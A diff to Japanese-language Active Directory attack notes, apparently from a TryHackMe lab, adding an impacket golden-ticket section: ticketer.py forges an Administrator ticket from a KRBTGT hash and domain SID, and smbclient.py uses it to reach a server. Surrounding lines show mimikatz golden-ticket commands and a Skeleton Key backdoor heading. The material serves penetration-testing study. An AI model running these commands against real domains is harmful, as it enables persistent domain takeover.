@@ -205,6 +205,18 @@ mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:<s
 mimikatz # misc::cmd
 ```
 
+### impacket を使う攻撃
+
+必要なのは、KRBTGTハッシュとドメインSID。
+
+```sh
+ticketer.py -nthash <KRBTGT-hash> -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
+
+export KRB5CCNAME=Administrator.ccache
+
+smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
+```
+
 ## Backdoor（スケルトンキー）
 
 ドメインフォレストのメモリに埋め込まれることで、マスターパスワードを持つ任意のマシンへのアクセスを可能にする。  
